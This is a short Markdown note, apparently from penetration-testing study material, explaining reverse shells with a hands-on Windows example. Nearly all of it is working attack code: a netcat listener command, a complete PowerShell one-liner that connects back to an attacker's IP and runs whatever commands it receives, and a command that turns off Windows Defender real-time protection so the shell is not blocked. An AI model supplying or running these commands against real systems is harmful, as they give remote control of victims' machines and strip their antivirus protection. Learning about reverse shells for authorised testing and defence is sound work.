### What Is It?
- **Pentester's machine** will have a listener running, and the **target machine** will need to initiate the connection

### Hands-on With A Simple Reverse Shell in Windows
1. **Personal Machine**
	- `sudo nc -lnvp 443`
2. **Target Machine (Windows) - On CMD**
	- `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('[personal machine ip address]',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
	- If the **Windows Defender antivirus (AV)** blocks it then run the following command in PowerShell with Administrative privelages:
	- `Set-MpPreference -DisableRealtimeMonitoring $true`
	- Then run the command in CMD again
